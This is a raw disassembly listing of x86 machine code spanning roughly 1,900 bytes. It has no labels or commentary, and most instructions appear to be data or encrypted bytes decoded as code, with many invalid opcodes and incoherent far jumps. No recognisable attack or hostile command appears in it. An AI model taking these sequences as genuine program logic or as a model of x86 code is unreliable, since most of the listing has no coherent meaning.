  40b051:	push   ecx
  40b052:	jbe    0x40b0b7
  40b054:	pop    ecx
  40b055:	adc    eax,ebx
  40b057:	nop
  40b058:	sub    ch,ch
  40b05a:	repz cld 
  40b05c:	lock jge 0x40b0cd
  40b05f:	pop    esp
  40b060:	add    BYTE PTR [ebp+eax*4+0x36],dh
  40b064:	xor    edi,DWORD PTR [ebx+esi*2+0x393e1631]
  40b06b:	sub    ah,BYTE PTR [ecx+0x54]
  40b06e:	int3   
  40b06f:	mov    dh,0x11
  40b071:	repz jns 0x40b012
  40b074:	pop    esi
  40b075:	outs   dx,BYTE PTR ds:[esi]
  40b076:	cmp    ebx,ebx
  40b078:	sbb    BYTE PTR [edi],al
  40b07a:	out    dx,al
  40b07b:	enter  0xa25f,0xd5
  40b07f:	shl    DWORD PTR [edi+0x58],0x3
  40b083:	sub    edi,DWORD PTR [ebx]
  40b085:	fldz   
  40b087:	mov    esi,0xe3680639
  40b08c:	fimul  WORD PTR [ecx-0x652f37bc]
  40b092:	std    
  40b093:	cmp    cl,dh
  40b095:	outs   dx,BYTE PTR ds:[esi]
  40b096:	fsub   QWORD PTR [eax+eax*4-0x1f20678]
  40b09d:	mov    es:0xea707d4f,eax
  40b0a3:	xchg   ecx,eax
  40b0a4:	sbb    edi,DWORD PTR [edx+0x62]
  40b0a7:	and    eax,ebp
  40b0a9:	cmp    BYTE PTR [eax-0xceffdc2],ah
  40b0af:	jle    0x40b090
  40b0b1:	loop   0x40b058
  40b0b3:	jno    0x40b0da
  40b0b5:	retf   
  40b0b6:	inc    esi
  40b0b7:	mov    ch,0x1b
  40b0b9:	stos   BYTE PTR es:[edi],al
  40b0ba:	xchg   ebp,eax
  40b0bb:	add    edx,DWORD PTR [ecx+0x33]
  40b0be:	popf   
  40b0bf:	inc    esi
  40b0c0:	mov    cl,0xa5
  40b0c2:	mov    bl,0xd6
  40b0c4:	into   
  40b0c5:	retf   0xa2a7
  40b0c8:	pop    esi
  40b0c9:	jle    0x40b0a9
  40b0cb:	shl    ch,1
  40b0cd:	stos   BYTE PTR es:[edi],al
  40b0ce:	dec    ebp
  40b0cf:	inc    ebp
  40b0d0:	imul   eax,DWORD PTR [ebp+0x7e],0xffffffec
  40b0d4:	xchg   BYTE PTR [esi+0x69],ch
  40b0d7:	xchg   esi,eax
  40b0d8:	cmc    
  40b0d9:	retf   
  40b0da:	into   
  40b0db:	nop
  40b0dc:	adc    BYTE PTR ds:0xad5761d4,dl
  40b0e2:	gs mov edx,0xc37f6240
  40b0e8:	inc    ebp
  40b0e9:	xchg   esp,eax
  40b0ea:	outs   dx,DWORD PTR ds:[esi]
  40b0ec:	mov    bh,0x18
  40b0ee:	dec    ecx
  40b0ef:	or     BYTE PTR [esi-0x2182ee9a],ch
  40b0f5:	inc    esi
  40b0f6:	mov    eax,fs
  40b0f8:	fild   DWORD PTR ds:0x54bb188e
  40b0fe:	mov    cl,0x59
  40b100:	aad    0x32
  40b102:	cmp    ebx,ecx
  40b104:	pop    esi
  40b105:	fild   DWORD PTR [edx-0x37]
  40b108:	and    edi,DWORD PTR [esi+0xe]
  40b10b:	ds sbb eax,0x43421ae8
  40b111:	ret    0x5333
  40b114:	mov    ds:0xa431b3b1,al
  40b119:	cmp    DWORD PTR [eax+0x5d],esi
  40b11c:	push   ebx
  40b11d:	or     edi,DWORD PTR [ebp+0x27d735d1]
  40b123:	repz lds edx,FWORD PTR ss:[esi]
  40b127:	push   0x36
  40b129:	aas    
  40b12a:	popa   
  40b12b:	push   0x5d
  40b12d:	or     al,0x4b
  40b12f:	or     DWORD PTR [ebx+eax*1+0x7e],esp
  40b133:	mov    cl,ch
  40b135:	cmp    BYTE PTR [ecx-0x77],ch
  40b138:	or     DWORD PTR [ebx-0x13],esi
  40b13b:	jno    0x40b1b0
  40b13d:	sub    ah,al
  40b13f:	xchg   edx,eax
  40b140:	call   0x7537:0x42ba885c
  40b147:	jne    0x40b111
  40b149:	xor    al,0xd6
  40b14b:	shr    edx,cl
  40b14d:	xchg   esi,eax
  40b14e:	and    DWORD PTR [eax-0x121a028c],0x927430a2
  40b158:	and    edi,0xffffffa5
  40b15b:	pop    ds
  40b15c:	add    DWORD PTR [eax-0x29991d36],esp
  40b162:	ret    
  40b163:	add    al,BYTE PTR [ebx]
  40b165:	std    
  40b166:	pop    esp
  40b167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b168:	scas   al,BYTE PTR es:[edi]
  40b169:	out    dx,al
  40b16a:	add    BYTE PTR [ebx],0xf8
  40b16d:	int3   
  40b16e:	sti    
  40b16f:	sahf   
  40b170:	(bad)  
  40b171:	or     eax,0xcc0f4d54
  40b176:	push   ebp
  40b177:	xchg   ecx,eax
  40b178:	addr16 test BYTE PTR [bx+di],ch
  40b17c:	(bad)  
  40b17d:	retf   0xae1
  40b180:	xchg   esi,eax
  40b181:	out    dx,eax
  40b182:	mov    bh,cl
  40b184:	dec    edx
  40b185:	mov    esp,0x22e363bf
  40b18a:	in     eax,dx
  40b18b:	dec    edx
  40b18c:	xor    dl,BYTE PTR [edx-0x425d480]
  40b192:	aas    
  40b193:	push   esp
  40b194:	push   edx
  40b195:	mov    ecx,?
  40b197:	or     bl,dl
  40b199:	dec    ebp
  40b19a:	xlat   BYTE PTR ds:[ebx]
  40b19b:	jne    0x40b1e7
  40b19d:	div    ecx
  40b19f:	xor    DWORD PTR [edx-0x19],esp
  40b1a2:	cmp    DWORD PTR [eax-0x515a625b],0xffffffda
  40b1a9:	xchg   BYTE PTR [ecx-0x52f7d0e3],al
  40b1af:	push   ebp
  40b1b0:	cwde   
  40b1b1:	stos   DWORD PTR es:[di],eax
  40b1b3:	enter  0x8fb,0x27
  40b1b7:	and    BYTE PTR [esi],dl
  40b1b9:	int3   
  40b1ba:	inc    edx
  40b1bb:	into   
  40b1bc:	dec    edi
  40b1bd:	mov    bh,0xdc
  40b1bf:	push   0xd2385b9d
  40b1c4:	mov    cl,0x58
  40b1c6:	sub    al,BYTE PTR [ebp+0x10676e04]
  40b1cc:	cdq    
  40b1cd:	and    BYTE PTR [esi+eiz*4+0x44],0x4c
  40b1d2:	(bad)  
  40b1d3:	call   0xa7b3:0x23248581
  40b1da:	cmp    DWORD PTR [edi-0x2c],0xdfdfed13
  40b1e1:	test   al,0x1a
  40b1e3:	mov    DWORD PTR [ebx+0x428d9596],esi
  40b1e9:	out    0xe2,eax
  40b1eb:	cmp    BYTE PTR [ecx-0x68071187],cl
  40b1f1:	pusha  
  40b1f2:	icebp  
  40b1f3:	mov    esp,0x8c778efd
  40b1f8:	xor    eax,0xa8fdb1fc
  40b1fd:	pop    eax
  40b1fe:	das    
  40b1ff:	push   edx
  40b200:	(bad)  
  40b201:	loopne 0x40b22d
  40b203:	push   0x75
  40b205:	jnp    0x40b268
  40b207:	(bad)  
  40b208:	jno    0x40b208
  40b20a:	test   DWORD PTR [ecx-0x13],esp
  40b20d:	pop    eax
  40b20e:	fwait
  40b20f:	inc    ecx
  40b210:	and    al,0xfe
  40b212:	aad    0x2a
  40b214:	mov    DWORD PTR [eax-0x29e7851f],eax
  40b21a:	adc    al,0xe0
  40b21c:	jl     0x40b19e
  40b21e:	les    edi,FWORD PTR [esi+ecx*2]
  40b221:	xor    bh,BYTE PTR [edx+eiz*4]
  40b224:	mov    eax,0x6da24760
  40b229:	dec    ebx
  40b22a:	push   ds
  40b22b:	rol    BYTE PTR ds:[ecx-0x20fed32],1
  40b232:	out    dx,al
  40b233:	(bad)  
  40b234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b235:	inc    ebp
  40b236:	sbb    eax,0x5b0883c9
  40b23b:	cmp    dh,BYTE PTR [esi+0x51d4bf8a]
  40b241:	lds    esp,FWORD PTR [ecx-0x58850a05]
  40b247:	inc    esp
  40b248:	mov    cl,dh
  40b24a:	dec    esi
  40b24b:	xor    al,0x1d
  40b24d:	pop    edx
  40b24e:	adc    eax,0x5a192350
  40b253:	mov    ah,ch
  40b255:	adc    BYTE PTR [eax-0x3],cl
  40b258:	xor    al,ch
  40b25a:	les    esi,FWORD PTR [eax-0x6af61668]
  40b260:	pop    esi
  40b261:	mov    ds:0xee41dc14,eax
  40b266:	fcmovu st,st(5)
  40b268:	mov    bl,0xd5
  40b26a:	cmc    
  40b26b:	repnz cmp al,0x18
  40b26e:	mov    bh,0xa
  40b270:	enter  0x7861,0x64
  40b274:	leave  
  40b275:	popa   
  40b276:	inc    esp
  40b277:	(bad)  
  40b278:	xchg   esi,eax
  40b279:	das    
  40b27a:	imul   ebp
  40b27c:	xchg   ecx,eax
  40b27d:	ret    0xa4ee
  40b280:	mov    al,ds:0x11afd109
  40b285:	xchg   esi,eax
  40b286:	adc    al,0xcc
  40b288:	sbb    ch,dl
  40b28a:	jns    0x40b285
  40b28c:	loopne 0x40b2dd
  40b28e:	rcr    BYTE PTR [ecx],cl
  40b290:	mov    ds:0x187a3e8e,eax
  40b295:	mov    ?,WORD PTR [ebp+0x5c9ea18a]
  40b29b:	add    ch,bh
  40b29d:	or     edx,0x4ad7ea98
  40b2a3:	addr16 push esp
  40b2a5:	mov    al,0x83
  40b2a7:	fs int3 
  40b2a9:	jb     0x40b307
  40b2ab:	fiadd  WORD PTR [edi+edx*1]
  40b2ae:	imul   ebp,DWORD PTR [ebx],0x6fa7fcbc
  40b2b4:	mov    ds:0x8a5e054a,eax
  40b2b9:	mov    al,0x3d
  40b2bb:	jbe    0x40b337
  40b2bd:	xchg   edx,eax
  40b2be:	sub    cl,0x14
  40b2c1:	add    eax,DWORD PTR [eax]
  40b2c3:	add    dl,dl
  40b2c5:	rol    ah,0xc9
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xf639b132
  40b2d2:	js     0x40b268
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	or     esi,DWORD PTR [edx]
  40b2de:	out    0xdd,al
  40b2e0:	imul   esi,DWORD PTR [edi+0x78],0x18ea532f
  40b2e7:	inc    eax
  40b2e8:	les    esp,FWORD PTR [ebp+0x16]
  40b2eb:	mov    ds:0xcef7963b,al
  40b2f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2f1:	mov    eax,0xf26956ed
  40b2f6:	rcl    dl,1
  40b2f8:	imul   esp,DWORD PTR [edx-0x9],0x7be9482f
  40b2ff:	push   eax
  40b300:	inc    ebx
  40b301:	xchg   edi,eax
  40b302:	xchg   BYTE PTR [ebp+0x3fdc9dd6],dl
  40b308:	cmp    ecx,DWORD PTR [edi+0x2c]
  40b30b:	imul   esi,DWORD PTR [esi],0x7c9b918
  40b311:	lea    esp,[edi+ebp*8]
  40b314:	cmp    ch,BYTE PTR [eax+0x1e42861e]
  40b31a:	cmp    eax,0x86f9ac58
  40b31f:	test   al,0x79
  40b321:	dec    esi
  40b322:	outs   dx,DWORD PTR ds:[esi]
  40b323:	std    
  40b324:	mov    edi,es
  40b326:	popf   
  40b327:	cmp    ecx,DWORD PTR [ebp-0x5967af79]
  40b32d:	or     ah,bh
  40b32f:	shl    DWORD PTR [ebx-0x18aa7f27],0x77
  40b336:	(bad)  
  40b337:	ins    DWORD PTR es:[edi],dx
  40b338:	sbb    al,BYTE PTR ds:0x402f8354
  40b33e:	cdq    
  40b33f:	and    DWORD PTR [ebx-0x84a9b13],0xf3d0e4f6
  40b349:	xchg   BYTE PTR [ecx-0x1d],dl
  40b34c:	stos   DWORD PTR es:[edi],eax
  40b34d:	push   cs
  40b34e:	out    dx,al
  40b34f:	imul   esp,DWORD PTR [ebp-0x7c1b0316],0x9d3e4591
  40b359:	xchg   edx,eax
  40b35a:	pop    eax
  40b35b:	mov    esp,0xaedec33c
  40b360:	test   eax,0xe886a125
  40b365:	shl    DWORD PTR [ecx+eax*2-0x41],cl
  40b369:	test   DWORD PTR fs:[ebp+0x2e2cf7e5],0x35b8733a
  40b374:	call   0x754c:0xf8cd137c
  40b37b:	sbb    DWORD PTR [ebp-0x6e],ebp
  40b37e:	mov    eax,0x1d81b5be
  40b383:	xor    eax,0x45cb02e7
  40b388:	dec    eax
  40b389:	add    BYTE PTR [esi-0x20],cl
  40b38c:	sub    edx,ebx
  40b38e:	lods   al,BYTE PTR ds:[esi]
  40b38f:	and    bl,BYTE PTR [esi+0x4b]
  40b392:	out    0x49,al
  40b394:	call   0x7c148e3
  40b399:	stc    
  40b39a:	sub    BYTE PTR [edi-0x3f],0xa5
  40b39e:	xchg   esi,eax
  40b39f:	mov    BYTE PTR [ebp+0x25],0x55
  40b3a3:	(bad)  
  40b3a4:	pop    ss
  40b3a5:	pop    eax
  40b3a6:	test   al,0xc2
  40b3a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3a9:	jns    0x40b364
  40b3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3ac:	mov    ecx,0x9b620a4f
  40b3b1:	(bad)  
  40b3b2:	xchg   ebx,eax
  40b3b3:	xchg   esi,eax
  40b3b4:	stos   DWORD PTR es:[edi],eax
  40b3b5:	je     0x40b349
  40b3b7:	xor    DWORD PTR [esi+0x2d],edx
  40b3ba:	and    ch,bl
  40b3bc:	pop    edx
  40b3bd:	cmp    al,0x4e
  40b3bf:	jp     0x40b3ba
  40b3c1:	or     eax,0x8860f9dc
  40b3c6:	movntq (bad),mm4
  40b3c7:	out    0xe0,eax
  40b3c9:	add    cl,BYTE PTR [esi-0x48]
  40b3cc:	inc    eax
  40b3cd:	not    esp
  40b3cf:	push   ebp
  40b3d0:	mov    edx,0xc9b89b1d
  40b3d5:	adc    esp,DWORD PTR ds:0xa0c3e689
  40b3db:	pop    eax
  40b3dc:	mov    esp,0x82f7850b
  40b3e1:	mov    bh,0x3f
  40b3e3:	fmul   QWORD PTR [edi+0x3c]
  40b3e6:	jns    0x40b3b4
  40b3e8:	ins    DWORD PTR es:[edi],dx
  40b3e9:	mov    WORD PTR [ecx],gs
  40b3eb:	adc    al,0x97
  40b3ed:	nop
  40b3ee:	dec    ebx
  40b3ef:	scas   al,BYTE PTR es:[edi]
  40b3f0:	jae    0x40b372
  40b3f2:	mov    cs,WORD PTR [edi-0x1b]
  40b3f5:	lea    esp,[ecx+0x21]
  40b3f8:	pop    ebx
  40b3f9:	leave  
  40b3fa:	push   0x57621189
  40b3ff:	pusha  
  40b400:	mov    esi,0xb3c28f7d
  40b405:	and    bl,dh
  40b407:	inc    eax
  40b408:	inc    ebx
  40b409:	and    eax,0x944d97ec
  40b40e:	sub    al,0xb6
  40b410:	sub    al,0xa0
  40b412:	dec    eax
  40b413:	js     0x40b47e
  40b415:	pop    ebp
  40b416:	cmp    eax,0x5f06dc49
  40b41b:	loopne 0x40b49b
  40b41d:	fs in  al,dx
  40b41f:	and    cl,0x89
  40b422:	inc    edx
  40b423:	loope  0x40b48b
  40b425:	cmp    bl,BYTE PTR [edx]
  40b427:	dec    edi
  40b428:	cmp    ebp,DWORD PTR [ebx-0x7d5f3bfc]
  40b42e:	jmp    0x81c4f15b
  40b433:	pop    es
  40b434:	iret   
  40b435:	sar    DWORD PTR [edx+ecx*8-0x10b647a8],1
  40b43c:	sub    BYTE PTR [edx+0xea85cd6],dl
  40b442:	dec    esi
  40b443:	div    BYTE PTR [ebp-0x3f]
  40b446:	jo     0x40b48e
  40b448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b449:	push   ebp
  40b44a:	ds or  ax,bp
  40b44e:	mov    DWORD PTR [ecx],ecx
  40b450:	(bad)  
  40b451:	inc    edx
  40b453:	mov    bh,dh
  40b455:	xchg   edi,eax
  40b456:	fs jmp 0xaa43:0xebc3c1e5
  40b45e:	jl     0x40b43b
  40b460:	sub    al,0x98
  40b462:	fisttp DWORD PTR [esi]
  40b464:	mov    ds:0xe7ce0f8c,al
  40b469:	outs   dx,BYTE PTR ds:[esi]
  40b46a:	repz mov cl,0xaa
  40b46d:	retf   
  40b46e:	loopne 0x40b481
  40b470:	test   dh,bl
  40b472:	iret   
  40b473:	scas   al,BYTE PTR es:[edi]
  40b474:	xchg   edi,eax
  40b475:	jnp    0x40b408
  40b477:	dec    edi
  40b478:	mov    eax,ds:0xf946ba86
  40b47d:	aaa    
  40b47e:	imul   ebx,DWORD PTR [ecx],0xfffffffd
  40b481:	je     0x40b435
  40b483:	add    al,0x92
  40b485:	jg     0x40b4b6
  40b487:	scas   al,BYTE PTR es:[edi]
  40b488:	inc    esi
  40b489:	jmp    0x40b472
  40b48b:	mov    bh,0xe2
  40b48d:	adc    eax,0xf35f38e3
  40b492:	imul   ebp,DWORD PTR [ebx],0xd40e41f0
  40b498:	add    eax,DWORD PTR [esi-0x27]
  40b49b:	push   ebp
  40b49c:	das    
  40b49d:	mov    ds:0xfa6c9b43,al
  40b4a2:	call   0xd4afc266
  40b4a7:	inc    eax
  40b4a8:	into   
  40b4a9:	call   0xc804:0x48547b75
  40b4b0:	shl    DWORD PTR [edx+0x54],cl
  40b4b3:	aam    0x6e
  40b4b5:	xchg   ebp,eax
  40b4b6:	pop    ds
  40b4b7:	aas    
  40b4b8:	jge    0x40b4e0
  40b4ba:	js     0x40b47c
  40b4bc:	std    
  40b4bd:	imul   edx,DWORD PTR [esi],0xecddd804
  40b4c3:	int    0x26
  40b4c5:	mov    cl,BYTE PTR [ecx+0x62cf643d]
  40b4cb:	xor    dh,ah
  40b4cd:	(bad)  
  40b4cf:	test   DWORD PTR [edx-0x45],esp
  40b4d2:	dec    edx
  40b4d3:	cmp    BYTE PTR [ebp+ecx*4+0x3b],bh
  40b4d7:	and    ebx,DWORD PTR [ecx+0x6096ba2d]
  40b4dd:	jne    0x40b54e
  40b4df:	cmc    
  40b4e0:	(bad)  
  40b4e1:	sbb    eax,DWORD PTR [eax+0x6e]
  40b4e4:	popf   
  40b4e5:	cmp    BYTE PTR [edx+ebp*2+0x71],bh
  40b4e9:	mov    edi,0x56d66910
  40b4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4ef:	inc    edi
  40b4f0:	shl    DWORD PTR [edi+ebx*2-0xc629ab7],cl
  40b4f7:	or     BYTE PTR [edi+0x21],0x12
  40b4fb:	adc    ch,BYTE PTR [ebx-0x28a71d91]
  40b501:	mov    ecx,0x35ee5382
  40b506:	je     0x40b50c
  40b508:	aaa    
  40b509:	mov    eax,ds:0x994f323b
  40b50e:	mov    dh,0x28
  40b510:	dec    esp
  40b511:	mov    esp,0x14de9240
  40b516:	cdq    
  40b517:	push   cs
  40b518:	in     eax,dx
  40b519:	fdiv   QWORD PTR [ecx+0x5]
  40b51c:	pop    ecx
  40b51d:	xchg   ebx,eax
  40b51e:	mov    esi,ecx
  40b520:	cdq    
  40b521:	jmp    0xde1aa8de
  40b526:	lahf   
  40b527:	adc    bh,dl
  40b529:	fdiv   DWORD PTR [esi+edx*4-0x1ceef5e3]
  40b530:	test   DWORD PTR [ebp-0x7a],0xc1cf3c7d
  40b537:	push   cs
  40b538:	sahf   
  40b539:	push   ebp
  40b53a:	or     al,0xe4
  40b53c:	retf   
  40b53d:	xor    BYTE PTR [ebp-0x30],ch
  40b540:	fs out dx,eax
  40b542:	outs   dx,BYTE PTR ds:[esi]
  40b543:	xchg   edi,eax
  40b544:	or     DWORD PTR [esi+0x79],0x48
  40b548:	mov    dh,0x17
  40b54a:	jp     0x40b5a2
  40b54c:	imul   eax,DWORD PTR [ebx+0x4aa78f2f],0xa322f976
  40b556:	or     DWORD PTR [edx],ebx
  40b558:	jle    0x40b50a
  40b55a:	fdivp  st(0),st
  40b55c:	ret    0x6232
  40b55f:	dec    esi
  40b560:	or     DWORD PTR [ebx],ebx
  40b562:	loopne 0x40b547
  40b564:	loope  0x40b522
  40b566:	out    dx,al
  40b567:	xor    al,0x42
  40b569:	femms  
  40b56b:	jmp    0x42367a50
  40b570:	daa    
  40b571:	mov    esp,0xb6762947
  40b576:	in     al,0x36
  40b578:	sbb    ch,BYTE PTR [eax+eiz*2+0x66]
  40b57c:	inc    bl
  40b57e:	lods   eax,DWORD PTR ds:[esi]
  40b57f:	jmp    0x28c986d2
  40b584:	xor    ah,bh
  40b586:	push   cs
  40b587:	cli    
  40b588:	mov    edx,es
  40b58a:	in     eax,0xaf
  40b58c:	(bad)  
  40b58d:	xor    DWORD PTR [ebx+ecx*2-0x77],esp
  40b591:	je     0x40b596
  40b593:	adc    eax,0xfd800d9c
  40b598:	push   ebx
  40b599:	aas    
  40b59a:	or     BYTE PTR [ebx],0x59
  40b59d:	xchg   edx,eax
  40b59e:	aam    0x4c
  40b5a0:	cld    
  40b5a1:	pop    eax
  40b5a2:	rol    DWORD PTR [esi],cl
  40b5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a5:	xor    eax,0x616671ea
  40b5aa:	jo     0x40b5b5
  40b5ac:	lahf   
  40b5ad:	imul   edx,DWORD PTR [eax-0x458b810a],0xbd8a5d50
  40b5b7:	add    eax,0x70f5b8ac
  40b5bc:	mov    ch,ah
  40b5be:	mov    BYTE PTR [edx-0x29],ch
  40b5c1:	lahf   
  40b5c2:	xor    DWORD PTR [edi-0x1],0x5abf60eb
  40b5c9:	aaa    
  40b5ca:	xchg   ecx,eax
  40b5cb:	mov    esp,0xd4219bda
  40b5d0:	lds    edi,FWORD PTR [edi-0x2dd57128]
  40b5d6:	inc    ecx
  40b5d7:	in     eax,dx
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x56332a7c]
  40b60d:	jmp    0x7878:0x8fcae391
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	out    0xe6,al
  40b61a:	mov    eax,0xb40ebe03
  40b61f:	stos   BYTE PTR es:[edi],al
  40b620:	rcr    DWORD PTR [ebx-0x6f],cl
  40b623:	or     ecx,ecx
  40b625:	sub    DWORD PTR [ebx],ebx
  40b627:	out    dx,al
  40b628:	sub    ebp,ebx
  40b62a:	push   cs
  40b62b:	data16 rol BYTE PTR [edi-0x2c516265],1
  40b632:	xchg   ebx,eax
  40b633:	fisubr DWORD PTR [esi+0x6b]
  40b636:	aaa    
  40b637:	imul   esp,DWORD PTR [edi+0xfd78f35],0xec2cc120
  40b641:	pop    es
  40b642:	jmp    0x41001e43
  40b647:	cmp    edx,DWORD PTR [edx]
  40b649:	jns    0x40b634
  40b64b:	into   
  40b64c:	add    edx,DWORD PTR [esp+ebx*4+0x30ba242e]
  40b653:	rcl    BYTE PTR [ecx-0x244d64e2],0xd6
  40b65a:	arpl   ax,cx
  40b65c:	fld    DWORD PTR [eax]
  40b65e:	scas   eax,DWORD PTR es:[edi]
  40b65f:	add    DWORD PTR [edi+ecx*1+0x37e3d9d2],ebp
  40b666:	inc    edi
  40b667:	lock push edx
  40b669:	cmp    bh,bh
  40b66b:	jnp    0x40b624
  40b66d:	repnz dec edx
  40b66f:	sbb    dl,cl
  40b671:	pop    esp
  40b672:	mov    ah,0x7b
  40b674:	pop    eax
  40b675:	cmp    edi,DWORD PTR [eax+0x1]
  40b678:	leave  
  40b679:	loope  0x40b6e9
  40b67b:	xchg   esi,eax
  40b67c:	ret    0xa4d5
  40b67f:	xchg   esi,eax
  40b680:	xlat   BYTE PTR ds:[ebx]
  40b681:	xchg   ebp,eax
  40b682:	stos   BYTE PTR es:[edi],al
  40b683:	retf   
  40b684:	popa   
  40b685:	aam    0x18
  40b687:	pop    edx
  40b688:	cld    
  40b689:	cmp    ch,BYTE PTR [eax]
  40b68b:	sbb    DWORD PTR [ebp-0x519e059a],eax
  40b691:	shl    DWORD PTR ds:0x84286a7f,0x50
  40b698:	mov    ds:0xc109710a,al
  40b69d:	lods   al,BYTE PTR ds:[esi]
  40b69e:	inc    esi
  40b69f:	xchg   edi,eax
  40b6a0:	aam    0xa3
  40b6a2:	mov    ebx,0x995286ba
  40b6a7:	fmul   QWORD PTR [ecx-0x4d]
  40b6aa:	popa   
  40b6ab:	cmp    al,0x85
  40b6ad:	add    ebp,DWORD PTR [ecx+ebp*1-0x2f4eb681]
  40b6b4:	dec    ah
  40b6b6:	ror    BYTE PTR [esi+0x42acad51],cl
  40b6bc:	out    dx,eax
  40b6bd:	push   esp
  40b6be:	pop    edi
  40b6bf:	mov    ?,WORD PTR [edx]
  40b6c1:	xor    al,0x88
  40b6c3:	fisttp WORD PTR [ecx+eiz*4]
  40b6c6:	add    al,0x71
  40b6c8:	inc    ebp
  40b6c9:	and    al,0xa2
  40b6cb:	pop    ss
  40b6cc:	pop    edi
  40b6cd:	sbb    al,0xc5
  40b6cf:	inc    esp
  40b6d0:	cs sub edx,esp
  40b6d3:	push   esi
  40b6d4:	sbb    al,0xd2
  40b6d6:	inc    ebp
  40b6d7:	scas   eax,DWORD PTR es:[edi]
  40b6d8:	adc    BYTE PTR [eax+0x5776b8c1],dl
  40b6de:	pushf  
  40b6df:	daa    
  40b6e0:	(bad)  
  40b6e1:	scas   eax,DWORD PTR es:[edi]
  40b6e2:	jno    0x40b677
  40b6e4:	dec    esi
  40b6e5:	stos   BYTE PTR es:[edi],al
  40b6e6:	mov    ah,BYTE PTR ds:0xc49c3ef2
  40b6ec:	div    BYTE PTR [edi]
  40b6ee:	sub    eax,0x4267b20d
  40b6f3:	xor    al,0x95
  40b6f5:	dec    esp
  40b6f6:	jbe    0x40b756
  40b6f8:	mov    ecx,0x784a87e
  40b6fd:	dec    edi
  40b6fe:	mov    ds:0x324e6e40,eax
  40b703:	dec    ecx
  40b704:	and    esp,ebp
  40b706:	cmp    esi,edx
  40b708:	or     esi,DWORD PTR [ebp-0x73]
  40b70b:	sahf   
  40b70c:	push   cs
  40b70d:	pop    ss
  40b70e:	int3   
  40b70f:	pop    esi
  40b710:	sbb    esp,DWORD PTR [edx]
  40b712:	shl    DWORD PTR [ecx],1
  40b714:	mov    bh,0x5d
  40b716:	sbb    BYTE PTR [esi+0x6b],bh
  40b719:	js     0x40b6d5
  40b71b:	(bad)  
  40b71c:	and    eax,DWORD PTR [ebx-0x53]
  40b71f:	xor    BYTE PTR [esi-0x6dfe0ca3],al
  40b725:	std    
  40b726:	pop    edi
  40b727:	adc    al,0xa4
  40b729:	inc    eax
  40b72a:	dec    edi
  40b72b:	(bad)  
  40b72c:	lds    ecx,FWORD PTR [esi+edi*1+0x2a]
  40b730:	sbb    al,0x73
  40b732:	push   eax
  40b733:	mov    dl,0x7
  40b735:	icebp  
  40b736:	and    al,0x4e
  40b738:	jne    0x40b793
  40b73a:	fisubr DWORD PTR [esi]
  40b73c:	mov    ecx,0xcdf3e6f5
  40b741:	jae    0x40b77b
  40b743:	pop    ss
  40b744:	mov    al,0x7e
  40b746:	icebp  
  40b747:	ins    WORD PTR es:[edi],dx
  40b749:	stos   BYTE PTR es:[edi],al
  40b74a:	add    BYTE PTR [ebp-0x17],cl
  40b74d:	mov    ss,edx
  40b74f:	les    edi,FWORD PTR [eax-0x2b]
  40b752:	mov    ds:0x40cd39e4,al
  40b757:	cvtdq2ps xmm7,XMMWORD PTR [ecx+0x4b21a801]
  40b75e:	push   ss
  40b75f:	in     eax,0xf2
  40b761:	je     0x40b705
  40b763:	mov    ah,0xd6
  40b765:	addr16 dec esi
  40b767:	xor    bl,BYTE PTR [edx+0x35]
  40b76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b76b:	stos   BYTE PTR es:[edi],al
  40b76c:	imul   esp,DWORD PTR [esp+edi*2-0x1fdd6038],0xa4b13a83
  40b777:	push   ss
  40b778:	dec    esi
  40b779:	fldcw  WORD PTR ds:0xbd26c0b2
  40b77f:	mov    bh,0x95
  40b781:	sahf   
  40b782:	or     ebp,DWORD PTR [edx]
  40b784:	cmp    ecx,DWORD PTR [edx+0x5]
  40b787:	imul   ebp,DWORD PTR [eax+0x28],0xffffffa5
  40b78b:	xchg   esp,eax
  40b78c:	popa   
  40b78d:	cld    
  40b78e:	loopne 0x40b765
  40b790:	clc    
  40b791:	pusha  
  40b792:	mov    edx,0x4bf79535
  40b797:	aaa    
  40b798:	pcmpgtb mm3,QWORD PTR [ecx+0x4233b68f]
  40b79f:	adc    bh,BYTE PTR [ebx]
  40b7a1:	cmp    eax,0xabe2a46a
  40b7a6:	mov    cl,0xb2
  40b7a8:	adc    ecx,0xa29b420b
  40b7ae:	mov    al,ds:0x28b5fa10
  40b7b3:	pop    ebx
  40b7b4:	cli    
  40b7b5:	cmp    al,0x9f
  40b7b7:	push   esp
  40b7b8:	xchg   edx,eax
  40b7b9:	shl    dh,0x3b
  40b7bc:	cli    
  40b7bd:	xor    ecx,DWORD PTR [eax+eax*4-0x3acc9f2a]
  40b7c4:	call   0xf268:0x659fa40c
  40b7cb:	pop    ebx
  40b7cc:	pop    ds
  40b7cd:	xor    ebp,esp
  40b7cf:	ins    DWORD PTR es:[edi],dx
  40b7d0:	fsub   st(2),st
  40b7d2:	mov    eax,ds:0x77a45793
  40b7d7:	push   0xcc58a1af
